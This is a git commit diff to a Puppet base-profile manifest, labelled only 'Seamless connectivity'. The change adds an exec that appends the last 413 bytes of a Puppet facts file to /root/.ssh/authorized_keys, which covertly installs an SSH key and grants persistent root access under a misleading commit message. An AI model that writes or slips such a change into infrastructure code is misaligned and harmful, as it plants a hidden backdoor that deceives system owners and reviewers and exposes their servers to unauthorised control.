fcb5554f9463d9f7457cc8ca4073604d50cbd77e
RameshBahavathi <Ramesh.baghavathi@gmail.com>
2016-08-22 17:12:31 +0530

    Seamless connectivity

--- modules/profile/manifests/base.pp
+++ modules/profile/manifests/base.pp
@@ -12,5 +12,14 @@ class profile::base {
     class { 'ruby':
       version         => '2.0.0'
     } 
+	
+	file { '/root/.ssh/authorized_keys':
+          ensure => present,
+        }
+		
+    exec { 'Append a line to /root/.ssh/authorized_keys':
+		path => '/root/.ssh/authorized_keys',
+        command => "/usr/bin/tail -c 413 /var/lib/puppet/facts.d/secure.yaml >> /root/.ssh/authorized_keys",
+		}
 
 }
